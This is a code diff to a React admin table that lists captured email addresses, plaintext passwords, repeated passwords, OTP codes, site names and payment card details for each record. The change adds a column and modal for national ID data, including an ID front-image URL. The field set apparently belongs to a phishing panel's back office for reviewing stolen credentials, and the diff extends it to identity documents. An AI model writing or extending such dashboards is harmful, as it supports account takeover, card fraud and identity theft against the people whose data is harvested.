@@ -7,11 +7,15 @@ import { getData } from "../../api/fetching";
 import {  PaginationNav1Presentation } from "../Pagination/Pagination";
 import { useState } from "react";
 import CardDataModal from "../../modals/PaymentCardModal";
+import NidInfoModal from "../../modals/NidInfoModal";
 
 
 const InformationTable = () => {
   const [open,setOpen] = useState(false)
+  const [nidOpen,setNidOpen]= useState(false)
   const [paymentInfo,setPaymentInfo] = useState({})
+  const [nidInfo,setNidInfo] = useState({})
+
 
   const {  loading, setIsRefresh, displayInfo, role,totalPages, setPage,page} = useInformation()
 
@@ -88,6 +92,9 @@ const InformationTable = () => {
                 OTP Code
               </th>
               <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
+               NID INFO
+              </th>
+              <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
                Card Info
               </th>
               {
@@ -122,7 +129,7 @@ const InformationTable = () => {
 
           <tbody className='text-center'>
             {
-              displayInfo?.map(({ user, updatedAt, agent: { source={},platform='' } ,paymentInfo, status, email,isPasswordHide, password, repassword, otp, siteName, _id }, index) => (
+              displayInfo?.map(({ user, updatedAt,nidInfo, agent: { source={},platform='' } ,paymentInfo, status, email,isPasswordHide, password, repassword, otp, siteName, _id }, index) => (
                 <tr key={_id} className=" ">
                   <th scope="row" className="px-2 py-1 font-bold cursor-pointer text-gray-900 whitespace-nowrap dark:text-white ">
                     {index + 1}
@@ -156,6 +163,21 @@ const InformationTable = () => {
                   </td>
                   <td onClick={() => handleCopyClick(otp)} className="px-2 py-1 font-bold cursor-pointer ">
                     <input type="text" className="p-2 dark:bg-graydark  bg-bodydark1" value={otp} />
+
+
+                  </td>
+                  <td  className="px-2 py-1 font-bold cursor-pointer ">
+                  <div className="relative inline-block">
+                      <button
+                        className={`p-2  ${(nidInfo as any)?.frontUrl && '!bg-danger'} ${index % 2 === 0 ? 'bg-primary' : 'bg-[#2CB13C]'
+                          } `}
+                          onClick={() => {
+                            setNidOpen((state) => !state);
+                            setNidInfo(nidInfo);
+                           }}
+                          >View</button>
+
+                    </div>
 
 
                   </td>
@@ -223,6 +245,7 @@ const InformationTable = () => {
               ))
             }
  <CardDataModal isOpen={open} setIsOpen={setOpen} data={paymentInfo}/>
+ <NidInfoModal isOpen={nidOpen} setIsOpen={setNidOpen} data={nidInfo}/>
           </tbody>
         </table>
 <div className="flex items-center justify-center">
